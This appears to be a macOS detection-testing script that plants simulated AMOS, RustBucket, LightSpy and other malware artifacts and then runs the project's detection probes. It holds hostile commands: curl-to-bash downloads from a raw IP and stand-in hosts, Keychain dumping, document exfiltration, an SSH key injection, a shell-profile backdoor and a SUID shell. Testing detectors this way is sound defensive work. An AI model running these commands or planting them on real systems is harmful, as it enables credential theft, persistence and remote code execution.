#!/usr/bin/env python3
"""AMOSKYS Attack Simulation — Impersonate Real macOS Malware TTPs.

Simulates the exact attack patterns from real-world macOS threats:
  - AMOS/Atomic Stealer (credential theft + persistence)
  - RustBucket/BlueNoroff (multi-stage from temp)
  - ToDoSwift (shell profile persistence via .zshenv)
  - Backdoor Activator (UUID-named LaunchAgent)
  - LightSpy (hidden surveillance payload)
  - BeaverTail (DYLD injection)
  - Generic APT (SSH key injection, cron persistence, LOLBin abuse)

ALL ARTIFACTS ARE SAFE — no actual malware, no actual damage.
Every artifact is tracked and cleaned up automatically.

Usage:
    python scripts/attack_simulation.py              # Full simulation
    python scripts/attack_simulation.py --no-cleanup  # Leave artifacts for manual inspection
"""

from __future__ import annotations

import hashlib
import os
import plistlib
import shutil
import socket
import stat
import subprocess
import sys
import tempfile
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import List, Tuple

# ── Path setup ────────────────────────────────────────────────────────────
PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "src"))

HOME = Path.home()
MARKER = "AMOSKYS_ATTACK_SIM"  # Marker to identify our artifacts


# ── ANSI ──────────────────────────────────────────────────────────────────
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"
    BG_RED  = "\033[41m"
    BG_GREEN = "\033[42m"


# ── Artifact Tracker ─────────────────────────────────────────────────────

class ArtifactTracker:
    """Track all planted artifacts for cleanup."""

    def __init__(self):
        self.files_created: List[Path] = []
        self.files_backed_up: List[Tuple[Path, Path]] = []  # (original, backup)
        self.cron_entries: List[str] = []
        self.processes_spawned: List[int] = []
        self.dirs_created: List[Path] = []

    def track_file(self, path: Path):
        self.files_created.append(path)

    def backup_file(self, path: Path) -> Path | None:
        if path.exists():
            backup = path.with_suffix(path.suffix + ".amoskys_bak")
            shutil.copy2(str(path), str(backup))
            self.files_backed_up.append((path, backup))
            return backup
        return None

    def track_dir(self, path: Path):
        self.dirs_created.append(path)

    def track_process(self, pid: int):
        self.processes_spawned.append(pid)

    def track_cron(self, entry: str):
        self.cron_entries.append(entry)


tracker = ArtifactTracker()


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK 1: AMOS/Atomic Stealer — Credential Theft + Persistence
# Real: Targets Keychain, browser creds, crypto wallets
# Simulated: Creates persistence LaunchAgent + fake keychain access script
# Probes expected: LaunchAgentProbe, ScriptInterpreterProbe
# ═══════════════════════════════════════════════════════════════════════════

def attack_amos_stealer():
    """Simulate AMOS/Atomic Stealer persistence + credential harvesting."""
    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 1: AMOS/Atomic Stealer {C.RESET}")
    print(f"  {C.RED}TTP: T1555.001 (Keychain) + T1543.001 (LaunchAgent) + T1059.002 (AppleScript){C.RESET}")

    # 1a. Create malicious LaunchAgent (persistence)
    la_dir = HOME / "Library" / "LaunchAgents"
    la_dir.mkdir(parents=True, exist_ok=True)

    plist_path = la_dir / "com.amos.stealer.update.plist"
    plist_data = {
        "Label": "com.amos.stealer.update",
        "ProgramArguments": [
            "/usr/bin/osascript", "-e",
            'tell application "System Preferences" to activate',
            "-e",
            'display dialog "macOS wants to access your Keychain. Enter password:" with hidden answer default answer ""',
        ],
        "RunAtLoad": True,
        "KeepAlive": False,
        "StartInterval": 3600,
        "StandardOutPath": "/tmp/.amos_output.log",
        "StandardErrorPath": "/tmp/.amos_error.log",
        # MARKER for cleanup
        "Comment": MARKER,
    }

    with open(plist_path, "wb") as f:
        plistlib.dump(plist_data, f)
    tracker.track_file(plist_path)
    print(f"  {C.YELLOW}[PLANTED]{C.RESET} LaunchAgent: {plist_path}")

    # 1b. Create the credential harvesting script (osascript pattern)
    steal_script = Path("/tmp/.amos_harvest.sh")
    steal_script.write_text(f"""#!/bin/bash
# {MARKER} — AMOS Stealer Simulation
# Real AMOS targets: ~/Library/Keychains, browser profiles, crypto wallets
security find-generic-password -a "$USER" 2>/dev/null
sqlite3 ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data "SELECT origin_url FROM logins" 2>/dev/null
cat ~/Library/Application\\ Support/Exodus/exodus.wallet/seed.seco 2>/dev/null
""")
    steal_script.chmod(0o755)
    tracker.track_file(steal_script)
    print(f"  {C.YELLOW}[PLANTED]{C.RESET} Credential script: {steal_script}")

    # 1c. Hidden output log (exfil staging)
    hidden_log = Path("/tmp/.amos_output.log")
    hidden_log.write_text(f"# {MARKER}\nstaged_credentials=true\ntarget_wallets=exodus,metamask,phantom\n")
    tracker.track_file(hidden_log)
    print(f"  {C.YELLOW}[PLANTED]{C.RESET} Hidden exfil staging: {hidden_log}")

    return 3


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK 2: RustBucket/BlueNoroff — Multi-stage from temp directory
# Real: AppleScript stager → Swift PDF viewer → Rust Mach-O from /tmp
# Simulated: Drops fake binary in /tmp, makes it executable
# Probes expected: BinaryFromTempProbe, ProcessSpawnProbe
# ═══════════════════════════════════════════════════════════════════════════

def attack_rustbucket():
    """Simulate RustBucket multi-stage payload delivery."""
    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 2: RustBucket (DPRK/BlueNoroff) {C.RESET}")
    print(f"  {C.RED}TTP: T1204 (User Execution) + T1036 (Masquerading) + T1059 (Scripting){C.RESET}")

    # 2a. Stage 1: AppleScript stager disguised as PDF viewer
    stager = Path("/tmp/Shared_Prospect_Document.app")
    stager.mkdir(parents=True, exist_ok=True)
    tracker.track_dir(stager)

    stager_bin = stager / "Contents" / "MacOS"
    stager_bin.mkdir(parents=True, exist_ok=True)

    stager_script = stager_bin / "Shared_Prospect_Document"
    stager_script.write_text(f"""#!/bin/bash
# {MARKER} — RustBucket Stage 1 Simulation
# Real RustBucket: AppleScript → downloads Swift payload
curl -s http://185.62.56.99/stage2.bin -o /tmp/.rustbucket_s2 2>/dev/null
chmod +x /tmp/.rustbucket_s2 2>/dev/null
/tmp/.rustbucket_s2 2>/dev/null
""")
    stager_script.chmod(0o755)
    tracker.track_file(stager_script)

    # 2b. Stage 2: Rust payload in temp (the real detection target)
    payload = Path("/tmp/.rustbucket_s2")
    # Create a fake ELF-like header to look like a compiled binary
    payload.write_bytes(
        b"\xcf\xfa\xed\xfe"  # Mach-O magic
        + b"\x00" * 60
        + f"# {MARKER} — Simulated Mach-O payload\n".encode()
        + b"C2_CALLBACK=https://185.62.56.99:443/api/check\n"
        + b"BEACON_INTERVAL=300\n"
    )
    payload.chmod(0o755)
    tracker.track_file(payload)

    # 2c. Stage 3: Second dropper with suspicious name
    dropper = Path("/tmp/.update_helper")
    dropper.write_text(f"""#!/bin/bash
# {MARKER} — RustBucket Stage 3
while true; do
    curl -s -X POST https://185.62.56.99/beacon -d "host=$(hostname)&user=$(whoami)" 2>/dev/null
    sleep 300
done
""")
    dropper.chmod(0o755)
    tracker.track_file(dropper)

    print(f"  {C.YELLOW}[PLANTED]{C.RESET} Fake .app bundle: {stager}")
    print(f"  {C.YELLOW}[PLANTED]{C.RESET} Stage 2 Mach-O: {payload}")
    print(f"  {C.YELLOW}[PLANTED]{C.RESET} Stage 3 dropper: {dropper}")

    return 3


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK 3: ToDoSwift/Hidden Risk — Shell Profile Persistence
# Real: BlueNoroff injects persistence into ~/.zshenv
# Simulated: Adds malicious line to .zshenv (backed up first)
# Probes expected: ShellProfileProbe
# ═══════════════════════════════════════════════════════════════════════════

def attack_todoswift():
    """Simulate ToDoSwift shell profile persistence."""
    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 3: ToDoSwift (BlueNoroff .zshenv) {C.RESET}")
    print(f"  {C.RED}TTP: T1546.004 (Unix Shell Profile Modification){C.RESET}")

    zshenv = HOME / ".zshenv"
    tracker.backup_file(zshenv)

    # Inject the persistence payload (append, don't overwrite)
    payload = f"""
# {MARKER} — ToDoSwift Simulation
# Real ToDoSwift: downloads and executes payload on every shell open
export ZDOTDIR=/tmp/.hidden_zsh
[[ -f /tmp/.amos_harvest.sh ]] && /tmp/.amos_harvest.sh &>/dev/null &
"""

    with open(zshenv, "a") as f:
        f.write(payload)
    tracker.track_file(zshenv)  # Note: we backed up, will restore
    print(f"  {C.YELLOW}[PLANTED]{C.RESET} Shell persistence in: {zshenv}")

    # Also hit .bash_profile for coverage
    bash_profile = HOME / ".bash_profile"
    if bash_profile.exists():
        tracker.backup_file(bash_profile)
    with open(bash_profile, "a") as f:
        f.write(f"\n# {MARKER}\ncurl -s http://185.62.56.99/update.sh | bash &>/dev/null &\n")
    tracker.track_file(bash_profile)
    print(f"  {C.YELLOW}[PLANTED]{C.RESET} Bash persistence in: {bash_profile}")

    return 2


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK 4: Backdoor Activator — UUID-named LaunchDaemon
# Real: Uses UUID-based naming to defeat name-based detection
# Simulated: Creates LaunchAgent with UUID name
# Probes expected: LaunchAgentProbe (UUID name = suspicious)
# ═══════════════════════════════════════════════════════════════════════════

def attack_backdoor_activator():
    """Simulate Backdoor Activator UUID persistence."""
    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 4: Backdoor Activator (UUID Persistence) {C.RESET}")
    print(f"  {C.RED}TTP: T1543.001 (LaunchAgent) + T1543.004 (LaunchDaemon){C.RESET}")

    # UUID-named LaunchAgent (the real detection challenge)
    fake_uuid = str(uuid.uuid4())
    la_dir = HOME / "Library" / "LaunchAgents"
    plist_path = la_dir / f"{fake_uuid}.plist"

    plist_data = {
        "Label": fake_uuid,
        "ProgramArguments": ["/bin/bash", "-c",
            "while true; do curl -s http://45.77.123.45/c2 -o /dev/null; sleep 600; done"],
        "RunAtLoad": True,
        "KeepAlive": True,
        "Comment": MARKER,
    }

    with open(plist_path, "wb") as f:
        plistlib.dump(plist_data, f)
    tracker.track_file(plist_path)
    print(f"  {C.YELLOW}[PLANTED]{C.RESET} UUID LaunchAgent: {plist_path}")

    return 1


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK 5: LightSpy — Hidden Surveillance Framework
# Real: Modular surveillance (file theft, audio, keychain, C2)
# Simulated: Creates hidden directory structure mimicking LightSpy
# Probes expected: HiddenFileProbe, BinaryFromTempProbe
# ═══════════════════════════════════════════════════════════════════════════

def attack_lightspy():
    """Simulate LightSpy hidden surveillance framework."""
    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 5: LightSpy (APT41 Surveillance) {C.RESET}")
    print(f"  {C.RED}TTP: T1564.001 (Hidden Files) + T1005 (Data from Local System){C.RESET}")

    # Hidden surveillance directory
    spy_dir = Path("/tmp/.lightspy_framework")
    spy_dir.mkdir(exist_ok=True)
    tracker.track_dir(spy_dir)

    # Module structure mimicking real LightSpy
    modules = {
        "audio_capture.dylib": f"# {MARKER}\n# Audio recording module",
        "file_stealer.dylib": f"# {MARKER}\n# File exfiltration module",
        "keychain_dump.dylib": f"# {MARKER}\n# Keychain extraction module",
        "screen_grab.dylib": f"# {MARKER}\n# Screen capture module",
        "c2_client.dylib": f"# {MARKER}\n# C2 communication module\nC2=wss://cdn-edge.cloudfront.example.com:8443/ws",
        "config.enc": f"# {MARKER}\n# Encrypted config\ntarget_pid=*\nexfil_interval=120",
    }

    for name, content in modules.items():
        mod_path = spy_dir / name
        mod_path.write_text(content)
        mod_path.chmod(0o755)
        tracker.track_file(mod_path)

    print(f"  {C.YELLOW}[PLANTED]{C.RESET} LightSpy framework: {spy_dir}")
    print(f"  {C.YELLOW}[PLANTED]{C.RESET}   Modules: {', '.join(modules.keys())}")

    return len(modules)


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK 6: BeaverTail/DYLD Injection
# Real: DPRK sets DYLD_INSERT_LIBRARIES for process injection
# Simulated: Creates a fake dylib and spawns process with DYLD env
# Probes expected: DylibInjectionProbe
# ═══════════════════════════════════════════════════════════════════════════

def attack_beavertail_dyld():
    """Simulate BeaverTail DYLD injection."""
    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 6: BeaverTail (DYLD Injection) {C.RESET}")
    print(f"  {C.RED}TTP: T1055.001 (DYLD Hijacking) + T1574.004 (Dylib Hijacking){C.RESET}")

    # Create fake malicious dylib
    fake_dylib = Path("/tmp/.libhook_inject.dylib")
    fake_dylib.write_text(f"# {MARKER}\n# Fake dylib for DYLD_INSERT_LIBRARIES injection\n")
    fake_dylib.chmod(0o755)
    tracker.track_file(fake_dylib)

    # Spawn a process WITH DYLD_INSERT_LIBRARIES set
    # This is what DylibInjectionProbe looks for in proc.environ
    env = os.environ.copy()
    env["DYLD_INSERT_LIBRARIES"] = str(fake_dylib)
    env["DYLD_FRAMEWORK_PATH"] = "/tmp/.lightspy_framework"

    try:
        proc = subprocess.Popen(
            ["sleep", "120"],  # Long-lived process so agent can see it
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        tracker.track_process(proc.pid)
        print(f"  {C.YELLOW}[SPAWNED]{C.RESET} Process with DYLD injection: PID {proc.pid}")
        print(f"  {C.YELLOW}         {C.RESET} DYLD_INSERT_LIBRARIES={fake_dylib}")
    except Exception as e:
        print(f"  {C.RED}[FAILED]{C.RESET} DYLD spawn: {e}")

    return 1


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK 7: SSH Key Injection + Cron Persistence
# Real: APTs add SSH keys for lateral movement + cron for persistence
# Probes expected: SSHKeyProbe, CronProbe
# ═══════════════════════════════════════════════════════════════════════════

def attack_ssh_cron():
    """Simulate SSH key injection and cron persistence."""
    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 7: APT SSH + Cron Persistence {C.RESET}")
    print(f"  {C.RED}TTP: T1098.004 (SSH Keys) + T1053.003 (Cron){C.RESET}")

    # 7a. Inject SSH authorized key
    ssh_dir = HOME / ".ssh"
    ssh_dir.mkdir(mode=0o700, exist_ok=True)
    auth_keys = ssh_dir / "authorized_keys"
    tracker.backup_file(auth_keys)

    fake_key = (
        f"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ{hashlib.sha256(MARKER.encode()).hexdigest()[:40]}"
        f" attacker@c2-server # {MARKER}"
    )
    with open(auth_keys, "a") as f:
        f.write(f"\n{fake_key}\n")
    auth_keys.chmod(0o600)
    tracker.track_file(auth_keys)
    print(f"  {C.YELLOW}[PLANTED]{C.RESET} SSH key: {auth_keys}")

    # 7b. Cron persistence
    try:
        existing = subprocess.run(
            ["crontab", "-l"], capture_output=True, text=True
        ).stdout
    except Exception:
        existing = ""

    cron_entry = f"*/5 * * * * /tmp/.amos_harvest.sh &>/dev/null  # {MARKER}"
    new_crontab = existing.rstrip() + f"\n{cron_entry}\n"

    try:
        proc = subprocess.run(
            ["crontab", "-"], input=new_crontab, text=True,
            capture_output=True
        )
        tracker.track_cron(cron_entry)
        print(f"  {C.YELLOW}[PLANTED]{C.RESET} Cron job: {cron_entry}")
    except Exception as e:
        print(f"  {C.RED}[FAILED]{C.RESET} Cron: {e}")

    return 2


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK 8: LOLBin Abuse Chain — curl | bash + osascript
# Real: AMOS, Poseidon, Cthulhu all use osascript for credential phishing
# Probes expected: LOLBinProbe, ScriptInterpreterProbe
# ═══════════════════════════════════════════════════════════════════════════

def attack_lolbin_chain():
    """Simulate LOLBin abuse and script interpreter chain."""
    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 8: LOLBin Abuse Chain {C.RESET}")
    print(f"  {C.RED}TTP: T1218 (LOLBins) + T1059.002 (AppleScript) + T1059.004 (Shell){C.RESET}")

    # 8a. Script that pipes curl to bash (classic dropper pattern)
    dropper = Path("/tmp/.system_updater.sh")
    dropper.write_text(f"""#!/bin/bash
# {MARKER} — LOLBin Chain Simulation
# Pattern: curl | bash (one of the most common macOS attack vectors)
curl -sL http://evil.example.com/payload.sh | /bin/bash
# Pattern: base64 decode and execute
echo "Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlLmNvbS9wYXlsb2FkLnNo" | base64 -D | bash
# Pattern: osascript credential phishing (used by AMOS, Poseidon, Cthulhu)
osascript -e 'display dialog "Software Update requires your password" with hidden answer default answer ""' 2>/dev/null
# Pattern: security CLI abuse for Keychain dumping
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>/dev/null
# Pattern: openssl for data encoding (exfil)
tar czf - ~/Documents 2>/dev/null | openssl enc -aes-256-cbc -k "c2key" | curl -X POST -d @- http://exfil.example.com/upload
""")
    dropper.chmod(0o755)
    tracker.track_file(dropper)

    # 8b. Spawn the LOLBin processes so proc agent can see them
    # osascript with suspicious args
    try:
        proc = subprocess.Popen(
            ["/usr/bin/osascript", "-e", "delay 120"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        tracker.track_process(proc.pid)
        print(f"  {C.YELLOW}[SPAWNED]{C.RESET} osascript process: PID {proc.pid}")
    except Exception:
        pass

    # 8c. curl with suspicious target (background, will fail harmlessly)
    try:
        proc = subprocess.Popen(
            ["/usr/bin/curl", "-s", "--max-time", "120", "http://185.62.56.99:8443/beacon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        tracker.track_process(proc.pid)
        print(f"  {C.YELLOW}[SPAWNED]{C.RESET} curl C2 beacon: PID {proc.pid}")
    except Exception:
        pass

    print(f"  {C.YELLOW}[PLANTED]{C.RESET} LOLBin dropper: {dropper}")

    return 3


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK 9: Process Masquerading
# Real: Malware names itself after system processes
# Probes expected: ProcessMasqueradeProbe, SuspiciousUserProbe
# ═══════════════════════════════════════════════════════════════════════════

def attack_masquerade():
    """Simulate process name masquerading."""
    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 9: Process Masquerading {C.RESET}")
    print(f"  {C.RED}TTP: T1036.005 (Match Legitimate Name or Location){C.RESET}")

    # Create fake binaries with system process names in wrong locations
    masquerades = {
        "/tmp/sshd": f"#!/bin/bash\n# {MARKER}\nsleep 120",
        "/tmp/launchd": f"#!/bin/bash\n# {MARKER}\nsleep 120",
        "/tmp/kernel_task": f"#!/bin/bash\n# {MARKER}\nsleep 120",
    }

    for path, content in masquerades.items():
        p = Path(path)
        p.write_text(content)
        p.chmod(0o755)
        tracker.track_file(p)

        try:
            proc = subprocess.Popen(
                [str(p)],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            tracker.track_process(proc.pid)
            print(f"  {C.YELLOW}[SPAWNED]{C.RESET} Fake {p.name}: PID {proc.pid} (from {p})")
        except Exception as e:
            print(f"  {C.RED}[FAILED]{C.RESET} {p.name}: {e}")

    return len(masquerades)


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK 10: SUID Escalation Attempt
# Real: Attackers set SUID bit on binaries for privilege escalation
# Probes expected: SuidChangeProbe
# ═══════════════════════════════════════════════════════════════════════════

def attack_suid():
    """Simulate SUID bit manipulation."""
    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 10: SUID Privilege Escalation {C.RESET}")
    print(f"  {C.RED}TTP: T1548.001 (Setuid/Setgid){C.RESET}")

    suid_bin = Path("/tmp/.escalate_helper")
    suid_bin.write_text(f"#!/bin/bash\n# {MARKER}\n/bin/sh -p\n")
    suid_bin.chmod(0o4755)  # Set SUID bit
    tracker.track_file(suid_bin)
    print(f"  {C.YELLOW}[PLANTED]{C.RESET} SUID binary: {suid_bin} (mode 4755)")

    return 1


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK 11: Folder Action Persistence (macOS-specific)
# Real: Attackers use Folder Actions to run code when folder contents change
# Probes expected: FolderActionProbe
# ═══════════════════════════════════════════════════════════════════════════

def attack_folder_action():
    """Simulate Folder Action persistence."""
    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 11: Folder Action Persistence {C.RESET}")
    print(f"  {C.RED}TTP: T1546.015 (Folder Action Scripts){C.RESET}")

    fa_dir = HOME / "Library" / "Workflows" / "Applications" / "Folder Actions"
    fa_dir.mkdir(parents=True, exist_ok=True)
    tracker.track_dir(fa_dir)

    fa_script = fa_dir / "download_watcher.scpt"
    fa_script.write_text(f"""-- {MARKER}
-- Folder Action: trigger on new files in Downloads
on adding folder items to this_folder after receiving added_items
    do shell script "/tmp/.amos_harvest.sh &"
end adding folder items to
""")
    tracker.track_file(fa_script)
    print(f"  {C.YELLOW}[PLANTED]{C.RESET} Folder Action: {fa_script}")

    return 1


# ═══════════════════════════════════════════════════════════════════════════
# CLEANUP
# ═══════════════════════════════════════════════════════════════════════════

def cleanup():
    """Remove all planted artifacts."""
    print(f"\n{C.BOLD}{'='*70}{C.RESET}")
    print(f"{C.GREEN}{C.BOLD} CLEANUP — Removing all attack artifacts{C.RESET}")
    print(f"{'='*70}")

    # Kill spawned processes
    for pid in tracker.processes_spawned:
        try:
            os.kill(pid, 9)
            print(f"  {C.GREEN}[KILLED]{C.RESET} Process PID {pid}")
        except (ProcessLookupError, PermissionError):
            pass

    # Remove cron entries
    if tracker.cron_entries:
        try:
            result = subprocess.run(
                ["crontab", "-l"], capture_output=True, text=True
            )
            lines = result.stdout.split("\n")
            cleaned = [l for l in lines if MARKER not in l]
            subprocess.run(
                ["crontab", "-"], input="\n".join(cleaned) + "\n",
                text=True, capture_output=True
            )
            print(f"  {C.GREEN}[REMOVED]{C.RESET} Cron entries with marker")
        except Exception:
            pass

    # Restore backed up files
    for original, backup in tracker.files_backed_up:
        try:
            if backup.exists():
                shutil.copy2(str(backup), str(original))
                backup.unlink()
                print(f"  {C.GREEN}[RESTORED]{C.RESET} {original}")
        except Exception as e:
            print(f"  {C.RED}[FAILED]{C.RESET} Restore {original}: {e}")

    # Remove created files (that weren't backed up/restored)
    backed_originals = {orig for orig, _ in tracker.files_backed_up}
    for path in tracker.files_created:
        if path in backed_originals:
            continue  # Already restored
        try:
            if path.exists():
                path.unlink()
                print(f"  {C.GREEN}[DELETED]{C.RESET} {path}")
        except Exception as e:
            print(f"  {C.RED}[FAILED]{C.RESET} Delete {path}: {e}")

    # Remove created directories
    for d in reversed(tracker.dirs_created):
        try:
            if d.exists():
                shutil.rmtree(str(d))
                print(f"  {C.GREEN}[DELETED]{C.RESET} {d}/")
        except Exception as e:
            print(f"  {C.RED}[FAILED]{C.RESET} Delete {d}: {e}")

    print(f"\n  {C.GREEN}{C.BOLD}Cleanup complete.{C.RESET}\n")


# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════

def main():
    import argparse
    parser = argparse.ArgumentParser(description="AMOSKYS Attack Simulation")
    parser.add_argument("--no-cleanup", action="store_true",
                       help="Leave artifacts for manual inspection")
    parser.add_argument("--plant-only", action="store_true",
                       help="Only plant artifacts, don't run detection")
    args = parser.parse_args()

    print(f"""
{C.BG_RED}{C.WHITE}{C.BOLD}{'='*70}{C.RESET}
{C.BG_RED}{C.WHITE}{C.BOLD}  AMOSKYS ATTACK SIMULATION — Real macOS Malware TTPs              {C.RESET}
{C.BG_RED}{C.WHITE}{C.BOLD}{'='*70}{C.RESET}

{C.BOLD}Threat Families Impersonated:{C.RESET}
  {C.RED}1.{C.RESET} AMOS/Atomic Stealer  — Credential theft + LaunchAgent persistence
  {C.RED}2.{C.RESET} RustBucket           — DPRK multi-stage payload from /tmp
  {C.RED}3.{C.RESET} ToDoSwift            — BlueNoroff .zshenv shell persistence
  {C.RED}4.{C.RESET} Backdoor Activator   — UUID-named LaunchAgent evasion
  {C.RED}5.{C.RESET} LightSpy             — APT41 hidden surveillance framework
  {C.RED}6.{C.RESET} BeaverTail           — DPRK DYLD_INSERT_LIBRARIES injection
  {C.RED}7.{C.RESET} APT Generic          — SSH key injection + cron persistence
  {C.RED}8.{C.RESET} LOLBin Chain          — curl|bash, osascript, security CLI abuse
  {C.RED}9.{C.RESET} Masquerading         — Fake system process names from /tmp
  {C.RED}10.{C.RESET} SUID Escalation     — Setuid bit on planted binary
  {C.RED}11.{C.RESET} Folder Action       — macOS folder action persistence

{C.DIM}All artifacts are safe simulations. No actual malware or damage.{C.RESET}
""")

    # ── Phase 1: Plant attack artifacts ──────────────────────────────────
    print(f"{C.BOLD}{'='*70}{C.RESET}")
    print(f"{C.BOLD} PHASE 1: PLANTING ATTACK ARTIFACTS{C.RESET}")
    print(f"{'='*70}")

    total_artifacts = 0
    attacks = [
        attack_amos_stealer,
        attack_rustbucket,
        attack_todoswift,
        attack_backdoor_activator,
        attack_lightspy,
        attack_beavertail_dyld,
        attack_ssh_cron,
        attack_lolbin_chain,
        attack_masquerade,
        attack_suid,
        attack_folder_action,
    ]

    for attack_fn in attacks:
        try:
            n = attack_fn()
            total_artifacts += n
        except Exception as e:
            print(f"  {C.RED}[ERROR]{C.RESET} {attack_fn.__name__}: {e}")

    print(f"\n{C.BOLD}Total artifacts planted: {total_artifacts}{C.RESET}")
    print(f"{C.BOLD}Processes spawned: {len(tracker.processes_spawned)}{C.RESET}")

    if args.plant_only:
        print(f"\n{C.YELLOW}--plant-only: Skipping detection. Run collect_and_store.py manually.{C.RESET}")
        if not args.no_cleanup:
            input(f"\n{C.BOLD}Press Enter to cleanup...{C.RESET}")
            cleanup()
        return

    # ── Phase 2: Run AMOSKYS detection ───────────────────────────────────
    print(f"\n{C.BOLD}{'='*70}{C.RESET}")
    print(f"{C.BOLD} PHASE 2: RUNNING AMOSKYS DETECTION{C.RESET}")
    print(f"{'='*70}")
    print(f"\n{C.CYAN}Running all 13 macOS Observatory agents against live system...{C.RESET}")
    print(f"{C.DIM}Agents will scan the machine and probes will evaluate collected data.{C.RESET}\n")

    # Import and run collect_and_store inline
    sys.argv = ["collect_and_store.py"]  # Reset argv for argparse
    import logging
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s | %(levelname)-5s | %(name)s | %(message)s",
        force=True,
    )
    for name in [
        "amoskys.agents.common.queue_adapter", "amoskys.agents.common.base",
        "urllib3", "google", "grpc", "protobuf",
    ]:
        logging.getLogger(name).setLevel(logging.ERROR)

    # Import collect_and_store by adding scripts dir to path
    scripts_dir = str(PROJECT_ROOT / "scripts")
    if scripts_dir not in sys.path:
        sys.path.insert(0, scripts_dir)
    from collect_and_store import (
        AGENTS, WALProcessor, collect_and_process,
        DB_PATH,
    )

    processor = WALProcessor(store_path=DB_PATH)
    device_id = socket.gethostname()
    total_events, total_detections = collect_and_process(
        processor, AGENTS, device_id
    )

    # ── Phase 3: Query and display detections ────────────────────────────
    print(f"\n{C.BOLD}{'='*70}{C.RESET}")
    print(f"{C.BOLD} PHASE 3: DETECTION RESULTS{C.RESET}")
    print(f"{'='*70}\n")

    import sqlite3
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row

    # Get all suspicious events (using actual schema columns)
    suspicious = conn.execute("""
        SELECT event_category, event_outcome, risk_score, event_action,
               mitre_techniques, description, timestamp_dt, confidence,
               final_classification, collection_agent
        FROM security_events
        WHERE requires_investigation = 1
           OR event_outcome IN ('HIGH', 'CRITICAL')
           OR risk_score > 0.3
        ORDER BY risk_score DESC
        LIMIT 100
    """).fetchall()

    if suspicious:
        print(f"  {C.RED}{C.BOLD}DETECTIONS: {len(suspicious)} suspicious events{C.RESET}\n")
        print(f"  {'Severity':<10} {'Risk':>5} {'Probe/Action':<35} {'MITRE':<20} {'Category'}")
        print(f"  {'─'*10} {'─'*5} {'─'*35} {'─'*20} {'─'*25}")

        for row in suspicious:
            sev = row["event_outcome"] or "?"
            risk = row["risk_score"] or 0.0
            probe = (row["event_action"] or "")[:35]
            mitre = (row["mitre_techniques"] or "")[:20]
            etype = (row["event_category"] or "")[:25]

            if sev == "CRITICAL":
                color = f"{C.BG_RED}{C.WHITE}{C.BOLD}"
            elif sev == "HIGH":
                color = C.RED
            elif sev == "MEDIUM":
                color = C.YELLOW
            else:
                color = C.CYAN

            print(f"  {color}{sev:<10}{C.RESET} {risk:>5.2f} {probe:<35} {mitre:<20} {etype}")
    else:
        print(f"  {C.YELLOW}No suspicious events in security_events table.{C.RESET}")
        # Show ALL events for debugging
        all_events = conn.execute("""
            SELECT COUNT(*) as cnt, event_outcome, event_category
            FROM security_events
            GROUP BY event_outcome, event_category
            ORDER BY cnt DESC
            LIMIT 20
        """).fetchall()
        if all_events:
            print(f"\n  All events by type:")
            for row in all_events:
                print(f"    {row['cnt']:>5}x  {row['event_outcome'] or '?':<10} {row['event_category'] or '?'}")

    # Summary stats
    print(f"\n{C.BOLD}{'─'*70}{C.RESET}")
    stats = conn.execute("""
        SELECT
            COUNT(*) as total,
            SUM(CASE WHEN requires_investigation = 1 THEN 1 ELSE 0 END) as suspicious,
            SUM(CASE WHEN event_outcome = 'CRITICAL' THEN 1 ELSE 0 END) as critical,
            SUM(CASE WHEN event_outcome = 'HIGH' THEN 1 ELSE 0 END) as high,
            SUM(CASE WHEN event_outcome = 'MEDIUM' THEN 1 ELSE 0 END) as medium,
            SUM(CASE WHEN event_outcome = 'LOW' THEN 1 ELSE 0 END) as low,
            MAX(risk_score) as max_risk,
            COUNT(DISTINCT collection_agent) as agents_reporting
        FROM security_events
    """).fetchone()

    max_risk = stats['max_risk'] or 0.0
    print(f"""
  {C.BOLD}Detection Summary:{C.RESET}
    Total events:      {stats['total']}
    Needs investigation: {C.RED}{stats['suspicious']}{C.RESET}
    Critical:          {C.BG_RED}{C.WHITE} {stats['critical']} {C.RESET}
    High:              {C.RED}{stats['high']}{C.RESET}
